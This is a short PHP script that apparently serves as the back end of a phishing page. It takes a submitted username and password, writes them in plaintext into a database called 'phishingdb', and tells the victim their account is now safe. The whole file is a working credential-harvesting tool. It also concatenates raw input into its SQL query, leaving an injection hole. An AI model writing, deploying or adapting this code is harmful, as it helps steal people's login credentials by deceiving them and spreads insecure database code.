<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "phishingdb";

$user_name = $_POST["user_name"];
$pass = $_POST["user_pass"];
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

$sql = "INSERT INTO user (username, password)
VALUES ('".$user_name."','".$pass."')";

if ($conn->query($sql) === TRUE) {
    echo "Error corrected!! Your account is Safe ;)";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
$conn->close();
?>